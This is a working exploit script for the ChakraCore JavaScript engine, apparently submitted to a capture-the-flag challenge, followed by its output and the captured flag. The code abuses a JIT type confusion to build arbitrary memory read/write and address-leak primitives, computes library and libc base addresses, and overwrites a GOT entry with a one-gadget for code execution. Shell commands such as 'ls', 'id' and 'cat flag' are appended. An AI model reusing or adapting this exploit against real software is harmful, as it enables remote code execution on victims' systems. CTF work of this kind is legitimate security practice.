
Enter JS Code:
obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

dv1 = new DataView(new ArrayBuffer(0x100));
dv2 = new DataView(new ArrayBuffer(0x100));


BASE = 0x100000000;

function hex(x) {
    return "0x" + x.toString(16);
}



function opt(o, proto, value) {
    o.b = 1;
    let tmp = {__proto__: proto};
    o.a = value;
}


function main() {

    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    let o = {a: 1, b: 2};

    
    opt(o, o, obj); // o->auxSlots = obj (Step 1)
    
    o.c = dv1; // obj->auxSlots = dv1 (Step 2)
    
    obj.h = dv2; // dv1->buffer = dv2 (Step 3)
    
    
    let read64 = function(addr_lo, addr_hi) {
        // dv2->buffer = addr (Step 4)
        //print(hex(addr_lo)," ", hex(addr_hi))
        dv1.setUint32(0x38, addr_lo, true);
        dv1.setUint32(0x3C, addr_hi, true);
        
        // read from addr (Step 5)
        return dv2.getUint32(0, true) + dv2.getUint32(4, true) * BASE;
    }
    
    let write64 = function(addr_lo, addr_hi, value_lo, value_hi) {
        // dv2->buffer = addr (Step 4)
        dv1.setUint32(0x38, addr_lo, true);
        dv1.setUint32(0x3C, addr_hi, true);
        
        // write to addr (Step 5)
        dv2.setUint32(0, value_lo, true);
        dv2.setUint32(4, value_hi, true);
    }
    let addrof = function(object){
        obj.h = object;
        lo = dv1.getUint32(0, true);
        hi = dv1.getUint32(4, true);
        obj.h = dv2;
        return [lo,hi];    
    }

    // get dv2 vtable pointer
    vtable_lo = dv1.getUint32(0, true);
    vtable_hi = dv1.getUint32(4, true);
    print(hex(vtable_lo + vtable_hi * BASE));
    c = {};
    // read first vtable entry using the R\W primitive
    print(hex(read64(vtable_lo, vtable_hi)));

    // the base can be found by reading the first vtable entry of an Array,
    // which will be a pointer to the Finalize function. With an offet the
    // base can be calculated
    var x = new Array(16);
    x_addr = addrof(x);
    //print("x_addr", hex(x_addr[0] + x_addr[1] * BASE));
    vtable = read64(x_addr[0], x_addr[1]);
    //print("vtbl", hex(vtable));
    base = vtable - 0x198b50
    print("libChakraCore base:", hex(base))
    var execve_got = base + 0xe537e0;
    console.log("[+] execve_got @ " + execve_got.toString(16));

    //var execve_plt = read64(execve_got & 0xffffffff, execve_got >> 32);
    //console.log("[+] execve_plt  @ " + execve_plt.toString(16));

    var memmove_got = base + 0xE53108;
    console.log("[+] memmove_got @ " + memmove_got.toString(16));

    var memset_got = base + 0xE53248;
    console.log("[+] memset_got @ " + memset_got.toString(16));
    var strchr_got = base + 0xE533B8;
    console.log("[+] strchr_got @ " + strchr_got.toString(16));
    print(hex(read64(strchr_got & 0xffffffff, strchr_got / BASE)));
    var munmap_got = base + 0xE53418;
    console.log("[+] munmap_got @ " + munmap_got.toString(16));
    
    var mun_addr = read64(munmap_got & 0xffffffff, munmap_got / BASE);
    var libc_base = mun_addr - 0x11bab0;
    console.log("[+] libc_base @ " + libc_base.toString(16));
    print(hex(mun_addr));
    var one_g = libc_base + 0x10a38c;
    console.log("[+] one_g @ " + one_g.toString(16));
    write64(memset_got & 0xffffffff, memset_got/BASE, one_g&0xffffffff, one_g/BASE)
    (new Uint8Array(1)).set(1)
    // write a value to address 0x1111111122222222 using the R\W primitive (this will crash)
    write64(0x22222222, 0x11111111, 0x1337, 0x1337);
}

main();...;ls;id;id;id;exit

JS Output:
0x7f0bc42596e0
0x7f0bc35edb50
libChakraCore base: 0x7f0bc3455000
[+] execve_got @ 7f0bc42a87e0
[+] memmove_got @ 7f0bc42a8108
[+] memset_got @ 7f0bc42a8248
[+] strchr_got @ 7f0bc42a83b8
0x7f0bc6044fa0
[+] munmap_got @ 7f0bc42a8418
[+] libc_base @ 7f0bc5eb7000
0x7f0bc5fd2ab0
[+] one_g @ 7f0bc5fc138c
cat flag
;exit;TMCTF{0ldj1773r_15_7yp3_c0nfu510n_0f_dyn4m1c0bj3c7}
